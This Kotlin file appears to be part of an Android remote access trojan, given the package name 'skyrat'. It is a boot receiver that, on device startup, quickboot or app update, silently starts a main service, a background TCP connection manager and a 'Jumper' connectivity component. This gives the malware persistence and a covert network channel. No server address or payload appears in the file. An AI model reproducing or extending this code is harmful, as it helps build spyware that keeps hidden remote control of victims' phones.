package com.techsky.skyrat

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.util.Log

class BroadcastReceiverService : BroadcastReceiver() {

    companion object {
        private const val TAG = "BroadcastReceiverService"
        // Define custom actions as constants
        private const val ACTION_QUICKBOOT_POWERON = "android.intent.action.QUICKBOOT_POWERON"
        private const val HTC_QUICKBOOT_POWERON = "com.htc.intent.action.QUICKBOOT_POWERON"
    }

    override fun onReceive(context: Context, intent: Intent) {
        Log.d(TAG, "BroadcastReceiver triggered with action: ${intent.action}")

        when (intent.action) {
            Intent.ACTION_BOOT_COMPLETED,
            Intent.ACTION_MY_PACKAGE_REPLACED,
            Intent.ACTION_PACKAGE_REPLACED,
            ACTION_QUICKBOOT_POWERON,
            HTC_QUICKBOOT_POWERON -> {
                Log.d(TAG, "Device boot/update detected, starting services")
                startBackgroundServices(context)
            }
        }
    }

    private fun startBackgroundServices(context: Context) {
        try {
            Log.d(TAG, "Starting services from BroadcastReceiver")

            // Start MainService
            val serviceIntent = Intent(context, MainService::class.java)
            context.startService(serviceIntent)
            Log.d(TAG, "MainService started from boot")

            // Also initialize BackgroundTcpManager directly
            try {
                val backgroundManager = BackgroundTcpManager(context)
                backgroundManager.startConnection()
                Log.d(TAG, "Background TCP manager started from boot")
            } catch (e: Exception) {
                Log.e(TAG, "Failed to start background manager from boot: ${e.message}")
            }

            // Initialize Jumper for additional connectivity
            try {
                val jumper = Jumper(context)
                jumper.init()
                Log.d(TAG, "Jumper initialized from boot")
            } catch (e: Exception) {
                Log.e(TAG, "Failed to start Jumper from boot: ${e.message}")
            }

        } catch (e: Exception) {
            Log.e(TAG, "Error starting services from boot: ${e.message}", e)
        }
    }
}